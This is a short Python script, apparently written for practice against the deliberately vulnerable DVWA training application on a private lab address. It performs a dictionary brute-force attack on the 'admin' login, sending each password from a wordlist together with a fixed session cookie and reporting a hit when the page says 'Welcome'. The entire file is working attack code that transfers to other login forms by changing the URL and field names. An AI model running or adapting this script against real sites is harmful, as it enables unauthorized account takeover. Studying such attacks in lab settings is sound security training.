import requests

def webAttack():
   print(">>>>> DVWA Brute Force Login Attack <<<<<")
   dic = 'dic_passwd.txt'
   url = 'http://192.168.56.103/dvwa/vulnerabilities/brute/'
   flag = False

   with open(dic, 'r') as f:
      for passwd in f.readlines():
         passwd = passwd.strip()

         # PHPSESSID 알맞게 수정
         cookie = {"security":"low", "PHPSESSID":"5bfa88dac2a9896a0e80d9dac37cbceb"}
         data = {
            "username" : "admin",
            "password" : passwd,
            "Login" : "Login"
         }
         r = requests.get(url, params=data, cookies=cookie)

         if r.text.find("Welcome") > -1:
            print("[+] Find password :", passwd)
            flag = True
            break
         else:
            print("[-] Not password :", passwd)
            pass

   if not flag:
      print("[!] CAN NOT MATCH PASSWORDS in", dic)

   print(">>>>> Finish Attack <<<<<")


def main():
   print("Start Program!\n")
   webAttack()

if __name__ == '__main__':
   main()